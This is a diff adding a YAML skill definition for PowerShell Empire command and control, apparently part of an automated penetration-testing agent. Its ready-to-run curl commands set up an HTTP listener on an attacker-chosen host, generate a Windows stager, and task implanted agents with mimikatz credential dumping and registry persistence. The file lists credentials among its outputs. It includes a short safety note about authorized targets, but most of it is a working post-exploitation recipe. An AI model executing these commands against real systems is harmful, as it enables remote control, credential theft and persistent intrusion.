@@ -1,0 +1,73 @@
+id: empire_c2
+name: PowerShell Empire C2
+category: post_exploitation
+phase: EXPLOIT
+priority: 90
+target_types:
+  - lab
+  - external
+description: >
+  Command and Control framework with 400+ post-exploitation modules.
+  Use Empire's REST API for: listener setup, stager generation, agent interaction,
+  module execution (mimikatz, persistence, lateral movement).
+  Fileless PowerShell agents for Windows, Python3 agents for Linux/macOS.
+tags:
+  - c2
+  - empire
+  - powershell
+  - post-exploitation
+  - persistence
+  - lateral-movement
+mitre_techniques:
+  - T1059.001  # PowerShell
+  - T1547      # Boot or Logon Autostart Execution
+  - T1003      # OS Credential Dumping
+  - T1021      # Remote Services
+  - T1055      # Process Injection
+  - T1570      # Lateral Tool Transfer
+  - T1071.001  # Web Protocols
+inputs:
+  - access.json
+  - services.json
+outputs:
+  - c2_session.json
+  - credentials.json
+  - evidence.json
+prerequisites:
+  - access
+tools:
+  - curl
+  - python3
+evidence_collection:
+  - Listener setup confirmation
+  - Stager generation output
+  - Agent callback confirmation
+  - Module execution results
+commands:
+  setup_listener: |
+    curl -s -X POST http://empire:1337/api/v2/listeners \
+      -H "Content-Type: application/json" \
+      -d '{"name":"http_listener","template":"http","options":{"Host":"http://{LHOST}:8080","Port":"8080"}}'
+  generate_stager: |
+    curl -s -X POST http://empire:1337/api/v2/stagers \
+      -H "Content-Type: application/json" \
+      -d '{"template":"windows/launcher_bat","options":{"Listener":"http_listener"}}'
+  list_agents: |
+    curl -s http://empire:1337/api/v2/agents
+  run_mimikatz: |
+    curl -s -X POST http://empire:1337/api/v2/agents/{agent_name}/tasks \
+      -H "Content-Type: application/json" \
+      -d '{"module":"powershell/credentials/mimikatz/logonpasswords"}'
+  run_persistence: |
+    curl -s -X POST http://empire:1337/api/v2/agents/{agent_name}/tasks \
+      -H "Content-Type: application/json" \
+      -d '{"module":"powershell/persistence/elevated/registry"}'
+success_criteria:
+  - Listener created and listening
+  - Stager generated for target OS
+  - Agent callback received
+  - Post-exploitation modules execute successfully
+safety_notes:
+  - Only deploy to authorized targets
+  - Clean up listeners and agents after engagement
+  - Use HTTPS listeners for external targets
